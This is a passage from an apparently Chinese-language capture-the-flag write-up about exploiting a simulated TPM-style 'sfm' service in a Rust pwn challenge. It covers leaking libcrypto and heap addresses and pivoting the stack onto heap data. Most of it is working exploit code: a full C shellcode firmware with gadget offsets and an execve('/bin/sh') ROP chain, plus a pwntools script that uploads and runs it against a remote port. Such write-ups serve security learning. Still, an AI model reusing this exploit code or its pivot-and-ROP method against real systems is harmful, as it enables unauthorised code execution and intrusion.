000000e0  c0 6b d6 68  89 7f 00 00  21 00 00 00  00 00 00 00  │·k·h│····│!···│····│
000000f0  90 a4 5a 7e  c4 55 00 00  00 00 00 00  00 00 00 00  │··Z~│·U··│····│····│
00000100  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
```

根据简单的观察可知，这里写漏了一个lib地址，为`libcrypto.so.3`的一个固定地址，这个library题目中有给出，因此我们可以尝试利用这个构造ROP。  
然而根据之前溢出条件来看，程序最多可以控制的溢出只有`ret`地址和rpb处，因为这个结构体存在一些其他tag，导致如果我们尝试控制了`ret`地址之后，其他的地址可能就不好控制了。  
不过，我们从泄露的数据中还能看到一点`heap`的地址，那这里我们考虑到之前`create_object`可以塞入任意数据的事情，可以考虑做一个**栈迁移**，让我们的rsp指针跳转到堆上。  
首先，我们创建一个堆

```php
+--------------+
|              |
|              |
|              |
|              |
|              |
| NvStorage    |
+--------------+
```

此时，我们的栈修改如下:

```php
+--------------+          +----------------+
|              |<---+     |                |
|              |    |     |                |
|              |    |     |                |
|              |    |     |                |
|              |    |     |                |
| NvStorage    |    |     |                |
+--------------+    |     |                |
                    |     |                |
                    |     |                |
                    |     |                |
                    |     |                |
                    |     | pop rsp ret;   |
                    |     |                |
                    +-----+ NvStorage Addr |
                          +----------------+
```

这样就能让rsp指向`NvStorage`分配的内存中，从而保证有充足的空间存放ROP链。  
同时，我们使用`ropper`这个工具，即可快速的生成可以利用的ROP链

```php
ropper  -f .\libcrypto.so.3 --chain execve
```

考虑到整个程序攻击流程比较长（需要上传一个自己的固件，然后让固件与`sfm`通信），这里考虑先用pwntools模拟这个固件，写出相关的攻击流程，然后再办法将其转换成C代码。为了让其能够正常运行，我们需要有一些前置工作：

- 由于这个`sfm`使用的句柄来自环境变量，所以我们可以使用`socket.sockpair`来创建一对通信句柄，让其中一个句柄可被继承，然后设置为环境变量，即可实现通信。
- 需要对`sfm`这个binary使用`patchelf`，让其能够从我们指定的目标目录下进行libc的查找。

完成准备工作后，即可尝试写出python脚本进行漏洞利用。

#### 进一步做题

在Python代码执行成功后，我们需要继续贴合题目。

这里有个小疑问，我们能否直接上传一个shellcode，读取后台题目中的`trusted_firmware`呢？  
其实是不行的，因为这个程序仅能够支持`read,write,recvmsg`这几个中断调用，这就意味着我们无法读取攻击目标端上的`trusted_firmare`，而是得用前文提到的那种，上传的程序中**需要把整个`trusted_firmware`**包含进去。为了能够给我们自己的shellcode腾位置，我们需要按照前文提到的，将对应的binary进行压缩

简单检查了一下UPX的源码之后，发现其用的是一种叫做`LZMA`的压缩算法，经过上网搜了一段时间之后，找到一个[LZ4](https://github.com/jibsen/blz4/blob/master/lz4_depack.c)的压缩算法比较简单。可以使用这个算法帮我们将`trusted_firmware`压缩，然后我们再在我们的binary里面再把这个压缩后的程序解即可。

构建程序的时候需要注意：

- 程序应该尽可能的小，并且不包含elf头部等信息，只有基本的代码数据部分
- 从`raw`中可以看出，不应当包含libc中的内容，也就是说我们需要尽可能的只使用系统调用完成任务

其中，有一个编译shellcode的技巧是，我们可以让数据放在代码段，这样就可以很简单的只将代码段提取出来，例如我们声明:

```Cpp
unsigned char blob[] __attribute__((section(".text"))) 
```

此时就能将`blob`只存放在代码段。

然后就能使用下列编译策略将shellcode取出来

```php
gcc -Os -nostdlib -Wl,--gc-sections  -o firm.o firm.c
objcopy -O binary --only-section=.text firm.o firm.bin
```

#### 调试技巧

这个题目非常讲究调试技巧。首先，这里无法使用前文pwntools的方式辅助调试，毕竟我们此时确实需要启动两个进程；其次，两个进程一定要使用指定的句柄进行通信，这就导致我们不能像平时那样直接让双方进行通信。

这里用了一个取巧的办法，首先使用了下列python脚本创建一个`unix stream`存在的环境:

```python
import os
import socket
import subprocess

sock1, sock2 = socket.socketpair(socket.AF_UNIX, socket.SOCK_STREAM)
os.set_inheritable(sock1.fileno(), True)
os.set_inheritable(sock2.fileno(), True)

os.environ['SFM_FD'] = str(sock2.fileno())
os.environ['FIRMWARE_FD'] = str(sock1.fileno())

subprocess.call(['bash', '-i'], env=os.environ,pass_fds=(sock1.fileno(), sock2.fileno()))
```

接下来，在这个shell中，我们再后台启动`sfm`：

```php
./sfm &
```

这样我们就能从其他terminal对这个进程进行调试。同时，因为只有当前的terminal中有打开的句柄，此时可以使用

```php
./launcer ./firm.bin
```

来传入有效数据。

再无数次的试错后，终于成功的执行了后台程序:

```php
├─bash───python3───bash─┬─python3───ba+
                        └─sh
```

注意，由于按照我们调试技巧在后端启动了`sfm`，所以此时的`sh`其实会执行失败，不过如果能看到sh启动的话，大概率exp就是执行成功了。  
这里给出相关代码:

```C
#include <stddef.h>
#include <stdint.h>
#include <sys/socket.h>
#define __NR_write 1
#define __NR_read 0
#define __NR_recvmsg 47
#define __NR_exit

typedef struct __attribute__((__packed__)) {
    unsigned int _reservered;
    unsigned short command_code;
    unsigned short pad_;
} SfmCommand;

typedef struct __attribute__((__packed__)) {
    SfmCommand cmd;
    unsigned short bank_index;
    unsigned short pad_;
    unsigned char data[1024];
} SfmIntegrityBankUpdate;

typedef struct __attribute__((__packed__)) {
    SfmCommand cmd;
    unsigned short flags;
} SfmEstablishSecureIo;

typedef struct __attribute__((__packed__)) {
    SfmCommand cmd;
    unsigned short alg_id;
} SfmAttestQuote;

typedef struct __attribute__((__packed__)) {
    unsigned short policy_type;
    unsigned char data[64];
} SfmAuthorizationPolicy;

typedef struct __attribute__((__packed__)) {
    unsigned short size;
    unsigned char data[1024];
} NvStorageRaw;

typedef struct __attribute__((__packed__)) {
    SfmCommand cmd;
    unsigned short object_type;
    SfmAuthorizationPolicy policy;
    NvStorageRaw nv;
} SfmCreateObject;

typedef struct __attribute__((__packed__)) {
    unsigned char country_code[2];
    unsigned char _padding[2];
    unsigned char owner_name[64];
    unsigned char device_name[16];
    unsigned char serial_number[8];
    unsigned int creation_date;
} OwnershipRecordRaw;

typedef struct __attribute__((__packed__)) {
    SfmCommand cmd;
    unsigned int object_index;
    OwnershipRecordRaw record;
} SfmModifyObject;

typedef struct __attribute__((__packed__)) {
    SfmCommand cmd;
    unsigned int object_index;
} SfmCertifyObject;

void decompress_and_update();
int integrity_bank_update(int fd, int idx, unsigned char* buf, int size);
int establish_secure_io(int fd, unsigned short flags, int fds[]);
// unsigned long _get_pc();
// const char message[] = "Hello, World!\n";
unsigned char blob[];

ssize_t my_recvmsg(int sockfd, struct msghdr* msg, int flags);
void my_write(int fd, void* message, int length);
ssize_t my_read(int fd, void* buffer, size_t count) ;
// first send "SFMI"
void handshake(int fd);
unsigned long
lz4_depack(const void *src, void *dst, unsigned long packed_size);

#define my_memcpy(dst_, src_, n) \
do {\
    size_t _n = (n);\
    unsigned char* dst = (unsigned char*)dst_;\
    unsigned char* src = (unsigned char*)src_;\
    while (_n-- > 0) { *dst++ = *src++; }\
} while (0)

#define my_memset(dst_, x, n) \
do {\
    size_t _n = (n);\
    unsigned char* dst = (unsigned char*)dst_;\
    while (_n-- > 0) { *dst++ = (unsigned char)(x); }\
} while (0)

int _start(void) {  
    int fd = 3;
    int status = 0;
    int cookie = 0;
    status = my_read(fd, &cookie, sizeof(cookie));
    my_write(fd, (char *)&cookie, sizeof(cookie));
    // my_write(1, (char *)&cookie, sizeof(cookie));

    unsigned int *input = (unsigned int*)blob;
    unsigned int packed_sz = input[1];
    unsigned char *compressed_ptr = &input[2];

    unsigned char dec_bin[0x3000];
    my_memset(dec_bin, '\x00', sizeof(dec_bin));
    int out_size = 0;
        // int out_size = lz4_depack(compressed_ptr, dec_bin, packed_sz);
    {
        const unsigned char *in = (unsigned char *) compressed_ptr;
        unsigned char *out = (unsigned char *) dec_bin;
        unsigned long dst_size = 0;
        unsigned long cur = 0;
        unsigned long prev_match_start = 0;

        if (in[0] == 0) {
            return 0;
        }

        /* Main decompression loop */
        while (cur < packed_sz) {
            unsigned long token = in[cur++];
            unsigned long lit_len = token >> 4;
            unsigned long len = (token & 0x0F) + 4;
            unsigned long offs;
            unsigned long i;

            /* Read extra literal length bytes */
            if (lit_len == 15) {
                while (in[cur] == 255) {
                    lit_len += 255;
                    ++cur;
                }
                lit_len += in[cur++];
            }

            /* Copy literals */
            for (i = 0; i < lit_len; ++i) {
                out[dst_size++] = in[cur++];
            }

            /* Check for last incomplete sequence */
            if (cur == packed_sz) {
                /* Check parsing restrictions */
                if (dst_size >= 5 && lit_len < 5) {
                    return 0;
                }

                if (dst_size > 12 && dst_size - prev_match_start < 12) {
                    return 0;
                }

                break;
            }

            /* Read offset */
            offs = (unsigned long) in[cur] | ((unsigned long) in[cur + 1] << 8);
            cur += 2;

            /* Read extra length bytes */
            if (len == 19) {
                while (in[cur] == 255) {
                    len += 255;
                    ++cur;
                }
                len += in[cur++];
            }

            prev_match_start = dst_size;

            /* Copy match */
            for (i = 0; i < len; ++i) {
                out[dst_size] = out[dst_size - offs];
                ++dst_size;
            }
        }
        out_size = dst_size;
    }

    for (int i = 0; i < out_size; i += 1024) {
        {
            int fd = 3;
            unsigned char* buf = dec_bin + i;
            int size = 1024;
            SfmIntegrityBankUpdate bank_update;
            my_memset(&bank_update, 0, sizeof(SfmIntegrityBankUpdate));
            bank_update.cmd.command_code = 1;
            bank_update.bank_index = 1;
            my_memcpy(bank_update.data, buf, size);
            char* ptr = (char*)&bank_update;
            int ret_size = 0;
            asm volatile("syscall"
                : "=a" (ret_size)
                : "a"(__NR_write), "D"(fd), "S"(ptr), "d"(sizeof(SfmIntegrityBankUpdate))
                : "memory", "cc", "r11", "cx"
            );
            // my_write(fd, ptr, size);
            int ret_data = 0;
            int ret_value = 0;
            asm volatile("syscall"
                : "=a"(ret_value)
                : "a"(__NR_read), "D"(fd), "S"(&ret_data), "d"(4)
                : "rcx", "r11", "memory"
            );
        }
    }

    SfmAttestQuote attest;
    my_memset((unsigned char*)&attest, 0, sizeof(SfmAttestQuote));
    attest.cmd.command_code = 7;
    attest.alg_id = 4;
    my_write(fd, &attest, sizeof(attest));

    unsigned long long libcrypt = 0;
    unsigned long long leak_heap = 0;
    unsigned char data[1024];
    status = my_read(fd, data, 512);
    // data = client_fd.recv(512)
    // print(hexdump(data))
    libcrypt = *(unsigned long long *)&data[0x58];
    libcrypt -= 0x347990;
    // print(hex(libcrypt))
    leak_heap = *(unsigned long long *)&data[0x90];
    // print(hex(leak_heap))
    unsigned long long exp_rop_addr = leak_heap - 0x11620 + 0x18610;
    // print(hex(exp_rop_addr))

    // my_write(std_out, "leak libcrypt address",)
    unsigned long long pop_rsp_ret = libcrypt + 0xb726c;
    unsigned long long pop_rax_ret = libcrypt + 0xd46c7;
    unsigned long long pop_rcx_ret = libcrypt + 0x1bb813;
    unsigned long long mov_rcx_rax_ret = libcrypt + 0x114c45;
    unsigned long long pop_rdi_ret = libcrypt + 0xb71db;
    unsigned long long pop_rsi_ret = libcrypt + 0xba534;
    unsigned long long pop_rdx_ret = libcrypt + 0x2b89d3;
    unsigned long long syscall = libcrypt + 0x11ce96;
    unsigned long long data_segment = libcrypt + 0x43D000;
    unsigned long long data_8_segment = libcrypt + 0x43D008;

    unsigned char exp_rop[400];
    for(int i = 0; i < 400; i++)
    {
        exp_rop[i] = 0;
    }
    unsigned long long*exp_long_ptr = (unsigned long long *)exp_rop;

    exp_long_ptr[0] = pop_rax_ret;
    exp_long_ptr[1] = 0x68732f6e69622f2f;
    exp_long_ptr[2] = pop_rcx_ret;
    exp_long_ptr[3] = data_segment;
    exp_long_ptr[4] = mov_rcx_rax_ret;
    exp_long_ptr[5] = pop_rax_ret;
    exp_long_ptr[6] = 0;
    exp_long_ptr[7] = pop_rcx_ret;
    exp_long_ptr[8] = data_8_segment;
    exp_long_ptr[9] = mov_rcx_rax_ret;
    exp_long_ptr[10] = pop_rdi_ret;
    exp_long_ptr[11] = data_segment;
    exp_long_ptr[12] = pop_rsi_ret;
    exp_long_ptr[13] = data_8_segment;
    exp_long_ptr[14] = pop_rdx_ret;
    exp_long_ptr[15] = data_8_segment;
    exp_long_ptr[16] = pop_rax_ret;
    exp_long_ptr[17] = 0x3b;
    exp_long_ptr[18] = syscall;

    SfmCreateObject create_object;
    my_memset(&create_object, 0, sizeof(SfmCreateObject));
    create_object.cmd.command_code = 2;
    create_object.object_type = 3;
    create_object.policy.policy_type = 0;
    create_object.nv.size = 1024;
    my_memcpy((unsigned char*)&create_object.nv.data, (unsigned char*)&exp_rop, sizeof(exp_rop));
    my_write(fd, &create_object, sizeof(SfmCreateObject));
    status = my_read(fd, &status, 4);

    SfmModifyObject modify_object = {0};
    my_memset((unsigned char*)&modify_object, 0, sizeof(SfmModifyObject));
    modify_object.cmd.command_code = 3;
    modify_object.object_index =  0;
    modify_object.record.country_code[0] = 'A';
    modify_object.record.country_code[1] = 'A';

    for(int i = 0; i < 51; i++)
    {
        modify_object.record.owner_name[i] = '\xff';
    }
    modify_object.record.owner_name[51] = 'B';
    // owner_name = b'\xff'*51+b'B'*1 + b'\x00'*12
    my_memcpy(modify_object.record.device_name, &pop_rsp_ret, 8);
    for(int i = 8; i < 16; i++)
    {
        modify_object.record.device_name[i] = 'H';
    }
    my_memcpy(modify_object.record.serial_number, &exp_rop_addr, 8);
    my_write(fd, &modify_object, sizeof(SfmModifyObject));

    // client_fd.send(cmd)
    // print(client_fd.recv(4))
    status = my_read(fd, &status, 4);

    // # SfmCertifyObject
    SfmCertifyObject certify_object = {0};
    my_memset(&certify_object, 0, sizeof(SfmCertifyObject));
    certify_object.cmd.command_code = 6;
    certify_object.object_index = 0;
    // client_fd.send(cmd)
    my_write(fd, &certify_object, sizeof(certify_object));  

    while(1){};
    // p.interactive()
    return 0;
}

void my_write(int fd, void* message, int length) {
    // ssize_t ret;
    asm("syscall"
        : // "=a" (ret)
        : "a"(__NR_write), "D"(fd), "S"(message), "d"(length)
        : "memory", "cc", "r11", "cx"
    );
    // return ret;
}

ssize_t my_read(int fd, void* buffer, size_t count) {
    ssize_t result;
    asm("syscall"
        : "=a"(result)
        : "a"(__NR_read), "D"(fd), "S"(buffer), "d"(count)
        : "rcx", "r11", "memory"
    );
    return result;
}

#include "firmware.c"
```

这里没给出的`firemware.c`为使用了上述算法压缩后的`trusted_firmware`，然后存放在了`blob`变量中。

最后，我们将程序封装好，然后完成最后的exp编写

```python
from pwn import *
import binascii

fd = open("firm.bin",'rb')
content = fd.read()
content = content.ljust(0x2000,b'\x00')
fd.close()

p = remote("127.0.0.1",4444)
p.recvuntil("> ")
p.sendline("upload")

image = binascii.hexlify(content)
print(hex(len(image)))
p.sendline(image)

p.recvuntil("> ")
p.sendline("run")

p.interactive()
```

即可完成攻击

总结
--

这次Rust Pwn本质上其实是一个C语言漏洞导致的问题，然而其背后模拟的TPM架构，以及相关的认证绕过十分的有趣，可以在相关现实问题中进行相关考虑。